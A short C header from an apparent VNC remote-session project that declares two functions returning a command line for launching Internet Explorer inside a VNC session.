//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: ie.c
// $Revision: 148 $
// $Date: 2014-01-29 14:13:12 +0400 (Wed, 29 Jan 2014) $
// description: 
//	Support of launching IE in VNC session

#ifndef __IE_H_
#define __IE_H_

WINERROR IE_GetCommandLineW(PVNC_SESSION pSession, LPCWSTR szPath,LPWSTR *pNewCommandLine);
WINERROR IE_GetCommandLineA(PVNC_SESSION pSession, LPCSTR  szPath,LPSTR *pNewCommandLine);

#endif